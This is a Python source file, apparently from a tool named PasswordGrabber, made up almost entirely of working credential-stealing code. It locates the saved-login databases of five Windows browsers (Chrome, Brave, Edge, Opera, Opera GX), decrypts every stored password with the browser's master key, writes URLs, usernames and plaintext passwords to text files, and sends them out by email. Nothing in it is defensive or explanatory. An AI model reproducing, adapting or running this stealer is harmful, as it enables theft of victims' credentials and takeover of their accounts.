from PasswordGrabber.functions import get_secret_key, decrypt_password, send_email
import os
import sqlite3
import shutil

def get_passwords(browser_name, local_state_path, login_data_path):
    """
    Retrieves and decrypts passwords from the specified browser's login data.

    Args:
        browser_name (str): Name of the browser.
        local_state_path (str): Path to the browser's local state file.
        login_data_path (str): Path to the browser's login data file.

    Returns:
        list: A list of decrypted passwords with associated URLs and usernames.
    """
    secret_key = get_secret_key(PATH_LOCAL_STATE=local_state_path)
    shutil.copy2(login_data_path, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    main_list = [
        f"Index: {index}\nUrl: {data[0]}\nUsername: {data[1]}\nPassword: {decrypt_password(buff=data[2], master_key=secret_key)}\n{'=' * 50}\n"
        for index, data in enumerate(cursor.fetchall())
    ]
    cursor.close()
    conn.close()
    os.remove("Loginvault.db")
    return main_list

def save_passwords_to_file(uname, browser_name, passwords):
    """
    Saves the decrypted passwords to a file.

    Args:
        uname (str): Username of the system user.
        browser_name (str): Name of the browser.
        passwords (list): List of decrypted passwords.

    Returns:
        None
    """
    with open(f"{uname}_pass_{browser_name}.txt", mode="w", newline='\n', encoding='utf-8') as file:
        file.writelines(passwords)

def main(email, password):
    """
    Main function to retrieve and save passwords for multiple browsers,
    and send the passwords via email.

    Args:
        email (str): Email address to send the passwords to.
        password (str): Password for the email account.

    Returns:
        None
    """
    uname = os.getlogin()

    # Dictionary containing browser names and their respective user data paths
    browsers = {
        "chrome": rf"C:\Users\{uname}\AppData\Local\Google\Chrome\User Data",
        "brave": rf"C:\Users\{uname}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
        "edge": rf"C:\Users\{uname}\AppData\Local\Microsoft\Edge\User Data",
        "opera_gx": rf"C:\Users\{uname}\AppData\Roaming\Opera Software\Opera GX Stable",
        "opera": rf"C:\Users\{uname}\AppData\Roaming\Opera Software\Opera Stable"
    }

    # Loop through each browser and retrieve/save passwords
    for browser, path in browsers.items():
        try:
            local_state_path = os.path.normpath(f"{path}\Local State")
            login_data_path = os.path.normpath(f"{path}\Default\Login Data")
            passwords = get_passwords(browser, local_state_path, login_data_path)
            save_passwords_to_file(uname, browser, passwords)
        except Exception as e:
            print(f"[ERROR] {e}")

    # Send the collected passwords via email
    try:
        send_email(uname=uname, email=email, password=password)
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == '__main__':
    pass